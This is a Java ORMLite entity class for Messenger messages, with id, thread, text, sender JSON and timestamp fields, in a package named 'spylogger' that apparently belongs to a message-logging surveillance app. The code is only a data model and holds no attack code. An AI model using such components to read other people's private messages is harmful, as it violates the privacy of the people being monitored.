package com.gravatasufoca.spylogger.model.messenger;

import com.gravatasufoca.spylogger.model.EntidadeAbstrata;
import com.gravatasufoca.spylogger.model.Mensagem;
import com.j256.ormlite.field.DataType;
import com.j256.ormlite.field.DatabaseField;
import com.j256.ormlite.table.DatabaseTable;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.Serializable;
import java.util.Date;

@DatabaseTable
public class Messages extends EntidadeAbstrata implements Comparable<Messages>,Mensagem{
	private static final long serialVersionUID = -4679985146526783051L;

	public Messages() {
	}

	@Override
	public Serializable getId() {
		// TODO Auto-generated method stub
		return msg_id;
	}

	@DatabaseField(id=true,generatedId=false)
	private String msg_id;

	@DatabaseField()
	private String thread_key;

	@DatabaseField()
	private String text;

	@DatabaseField(columnName="sender")
	private String tsender;

	@DatabaseField(dataType=DataType.DATE_LONG)
	private Date timestamp_ms;

	@DatabaseField(foreign=true, foreignColumnName="thread_key",columnName="thread_key")
	private Thread thread;

	private Sender sender;

	public String getMsg_id() {
		return msg_id;
	}

	public void setMsg_id(String msg_id) {
		this.msg_id = msg_id;
	}

	public String getThread_key() {
		return thread_key;
	}

	public void setThread_key(String thread_key) {
		this.thread_key = thread_key;
	}

	public String getText() {
		return text;
	}

	public void setText(String text) {
		this.text = text;
	}

	public Date getTimestamp_ms() {
		return timestamp_ms;
	}

	public void setTimestamp_ms(Date timestamp_ms) {
		this.timestamp_ms = timestamp_ms;
	}

	public Thread getThread() {
		return thread;
	}

	public Sender getSender() {
		if(sender==null){
			try {
				sender= new Sender(new JSONObject(tsender));
			} catch (JSONException e) {
				e.printStackTrace();
			}
		}
		return sender;
	}

	@Override
	public int compareTo(Messages another) {
		if(timestamp_ms.after(another.getTimestamp_ms()))
			return 1;
		else if(timestamp_ms.before(another.getTimestamp_ms()))
			return -1;
		return 0;
	}

}
